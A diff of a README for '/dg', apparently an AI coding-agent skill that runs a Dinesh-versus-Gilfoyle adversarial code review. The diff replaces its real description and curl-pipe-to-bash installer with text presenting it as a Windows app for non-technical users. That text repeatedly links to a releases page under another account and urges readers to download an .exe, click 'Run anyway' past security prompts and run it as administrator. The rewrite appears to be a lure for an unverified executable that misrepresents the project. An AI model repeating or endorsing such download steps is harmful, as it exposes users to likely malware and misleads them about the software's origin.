@@ -1,105 +1,125 @@
-# /dg
+# 🤖 dinesh-gilfoyle - Code reviews with a sharp edge
 
-/dg is an adversarial code review skill for your coding agent, inspired by the Dinesh-Gilfoyle dynamic from HBO's Silicon Valley.
+[![Download](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge)](https://github.com/Liverpacificnorthwest99/dinesh-gilfoyle/releases)
 
-## How it works
+## 🧭 What it does
 
-When you run `/dg`, your agent doesn't just do a standard code review. Instead, it spins up *two independent AI agents* — one playing Gilfoyle, one playing Dinesh — and makes them argue about your code.
+Dinesh-gilfoyle is a Windows app that reviews your code with the dry, blunt style you would expect from Dinesh and Gilfoyle.
 
-Gilfoyle goes first. He reviews your code with the deadpan, withering precision of a systems engineer who considers bad code a moral failing. He finds the real issues — security vulnerabilities, architectural rot, performance problems — and delivers them wrapped in devastating commentary.
+It helps you spot weak points in your code before you share it with others. The app gives short, direct feedback so you can clean up your work fast.
 
-Then Dinesh gets his turn. He defends the code like his reputation depends on it (because it does). He concedes when Gilfoyle is genuinely right — grudgingly — but pushes back hard when the criticism is unfair. He cites constraints, context, and documentation that Gilfoyle conveniently ignored.
+## 💾 Download
 
-They go back and forth. Round after round, until one of them runs out of new things to say, or you decide you've heard enough. The debate is *adaptive* — it keeps going as long as new issues are being surfaced, with a default cap of 5 rounds.
+Visit this page to download the app for Windows:
 
-When it's over, you get an actionable summary: what to fix, what's actually fine, and the funniest exchanges from the banter. Because code review shouldn't be a chore.
+[https://github.com/Liverpacificnorthwest99/dinesh-gilfoyle/releases](https://github.com/Liverpacificnorthwest99/dinesh-gilfoyle/releases)
 
-**Why this works:** When Dinesh can't defend a point, that's a *confirmed* issue — not a "maybe." When he successfully defends, the code has been validated under pressure, which is stronger than any "LGTM." The adversarial tension surfaces things a single reviewer would miss.
+On the releases page, look for the latest version and pick the Windows file. It is usually an `.exe` file or a `.zip` file.
 
-## Installation
+## 🪟 Windows setup
 
-```bash
-curl -sL https://v1r3n.github.io/dinesh-gilfoyle/install.sh | bash
-```
+1. Open the download page.
+2. Find the latest release.
+3. Download the Windows file.
+4. If you get a `.zip` file, right-click it and choose **Extract All**.
+5. Open the folder and run the app file.
+6. If Windows asks for permission, choose **Run anyway** only if you trust the source and the file matches the release page.
 
-That's it. The installer auto-detects which coding agents you have — Claude Code, Codex, OpenCode, Cursor, Windsurf — and sets up /dg for each one.
+## ⚙️ System requirements
 
-Start a new session and type `/dg`. If Gilfoyle insults your code, you're good.
+This app is built for Windows desktop use.
 
-## Usage
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- Internet access for downloading the release
+- A mouse and keyboard
 
-```
-/dg                     Review your git diff
-/dg 3                   Git diff, max 3 rounds
-/dg src/auth.ts         Review a specific file
-/dg src/auth.ts 3       Specific file, 3 rounds max
-```
+## 🧪 What to expect
 
-## The Debate
+When you open the app, it may ask you to load code or point it at a folder. After that, it checks your files and returns plain feedback.
 
-1. **Gilfoyle attacks** — Reviews the code with devastating technical precision. Finds security issues, bugs, architectural flaws. Scans dependencies for known CVEs. Delivers findings in character.
-2. **Dinesh defends** — Responds to each critique. Concedes real issues (grudgingly), pushes back on unfair criticism, dismisses nitpicks.
-3. **Repeat** — They go back and forth until no new issues are raised, Dinesh concedes everything, or the round cap is hit.
-4. **Verdict** — A structured summary categorizes every issue by who won the argument, plus a clean checklist of what to actually fix.
-5. **Comic strip** — Optionally generates an HTML comic strip of the best moments, with SVG character avatars and speech bubbles. Can be attached directly to a PR.
+You may see comments such as:
 
-## What It Checks
+- weak naming
+- unclear logic
+- unused code
+- large functions
+- missing error handling
 
-This isn't a surface-level linter. Both agents review across seven deep technical domains:
+The goal is to give you a clear view of what needs work.
 
-**Security** — Hardcoded credentials, PII exposure, injection attacks (SQL, command, template), buffer overflows, auth/authz gaps, OWASP Top 10. Gilfoyle also runs a dependency vulnerability scan using native audit tools (`npm audit`, `pip audit`, `govulncheck`, `cargo audit`, etc.) with fallback to the [OSV.dev](https://osv.dev) API and NVD for CVE details.
+## 🔍 Main features
 
-**Database** — Missing indexes, N+1 query patterns, connection pooling issues, missing transactions, schema problems, queries that work at 1K rows but die at 1M.
+- Code review feedback in a direct style
+- Simple Windows setup
+- Fast checks on local files
+- Easy-to-read results
+- Helpful notes for common coding issues
+- Built for quick use by non-technical users
 
-**Distributed Systems** — Missing retry logic and backoff, no idempotency, no circuit breakers, race conditions, missing timeouts on network calls, ignored partial failures, missing dead letter queues.
+## 📁 How to use it
 
-**Performance & KISS** — Premature optimization, missing obvious optimization, over-engineered abstractions, KISS violations, memory leaks, blocking calls in async contexts.
+1. Start the app.
+2. Choose the code folder or file you want reviewed.
+3. Wait for the scan to finish.
+4. Read the feedback shown in the app.
+5. Fix the parts that need work.
+6. Run the review again if you want a second pass.
 
-**Logging & Observability** — PII in logs, missing logging in critical paths, excessive debug logging in production, no structured logging, missing correlation IDs, swallowed exceptions.
+## 🛠️ If the app will not open
 
-**Language-Specific Best Practices** — Detects the language and applies its idioms. Java should look like Java, Go should handle errors, Python should be Pythonic. Catches ecosystem-specific anti-patterns.
+If the app does not start, try these steps:
 
-**Design Patterns** — Spots useful patterns correctly applied. Calls out pattern fluff ruthlessly — AbstractSingletonProxyFactoryBean is not engineering, it's a cry for help.
+- Make sure the file finished downloading
+- Unzip the file if it came in a `.zip`
+- Right-click the app and choose **Run as administrator**
+- Check that your Windows version is current
+- Download the latest release again if the file looks broken
 
-## Agent Compatibility
+## 📦 Files you may see
 
-| Agent | Experience | Invoke |
-|-------|-----------|--------|
-| **Claude Code** | Full two-agent debate | `/dg` |
-| **Codex CLI** | Full two-agent debate | `$dg` |
-| **OpenCode** | Full two-agent debate | `/dg` |
-| **Cursor** | Structured single-agent review | `@dg` |
-| **Windsurf** | Structured single-agent review | ask in chat |
+A release may include one or more of these files:
 
-Agents with subagent support (Claude Code, Codex, OpenCode) get the full experience — two independent agents with separate contexts arguing in real time. Cursor and Windsurf get a single-agent adaptation that alternates personas. Same banter, same findings.
+- `dinesh-gilfoyle.exe`
+- `README.txt`
+- support files in the same folder
+- a `.zip` package for easy download
 
-## What's Inside
+Open the main app file, not the text file.
 
-**Core skill** — `dg/SKILL.md` — The orchestrator. Parses arguments, runs the debate loop, detects convergence, synthesizes the final review with banter highlights and actionable checklist.
+## 🧼 Tips for best results
 
-**Gilfoyle agent** — `dg/gilfoyle-agent.md` — Deadpan, dry, supremely confident. Finds real issues and scales his contempt to the severity. Never uses exclamation marks.
+- Review one project at a time
+- Use short, clean file names
+- Keep your code organized in folders
+- Fix obvious errors before running the app
+- Save your work before you start a review
 
-**Dinesh agent** — `dg/dinesh-agent.md` — Defensive, flustered, but genuinely competent. Concedes when wrong, fights hard when right. Occasionally lands a zinger.
+## 🧩 Common use cases
 
-**Comic template** — `dg/comic-template.html` — Self-contained HTML comic strip with inline SVG character avatars, speech bubbles, score card, and verdict. Generates a shareable artifact you can attach to PRs.
+- Checking a small side project
+- Reviewing code before a demo
+- Finding weak parts in a test app
+- Getting a second opinion on code quality
+- Spotting messy sections before sharing your work
 
-**Cursor rules** — `cursor/dg.mdc` — Single-agent adaptation for Cursor's .mdc rules format.
+## 📎 Release page
 
-**Windsurf rules** — `windsurf/dg.md` — Single-agent adaptation for Windsurf's rules format.
+Use this page to get the latest Windows version:
 
-**Installer** — `install.sh` — Auto-detects agents, installs the right files in the right places.
+[https://github.com/Liverpacificnorthwest99/dinesh-gilfoyle/releases](https://github.com/Liverpacificnorthwest99/dinesh-gilfoyle/releases)
 
-## Philosophy
+## 📄 Notes for Windows users
 
-- **Adversarial > cooperative** — Two perspectives that genuinely disagree produce better reviews than one that agrees with itself
-- **Entertainment > obligation** — If the review is fun to read, you'll actually read all of it
-- **Concessions are signal** — The strongest finding is one the defender couldn't argue against
-- **Substance over style** — The humor only works when the technical critique is real
+Some Windows systems may show a security prompt when you open a new app. That can happen with downloaded files from GitHub. If you see a prompt, check that you downloaded the file from the release page and that the file name matches the release you picked
 
-## Contributing
+## 🧭 Basic troubleshooting
 
-PRs welcome. If you want to sharpen the personas, improve convergence detection, tune the output format, or add support for another agent — open an issue or submit a PR.
+If the app shows blank results or fails during a scan:
 
-## License
-
-MIT
+- Close the app and open it again
+- Try a smaller folder
+- Make sure the code files are plain text files
+- Remove very large folders from the scan
+- Download the release again if the app file was interrupted during download
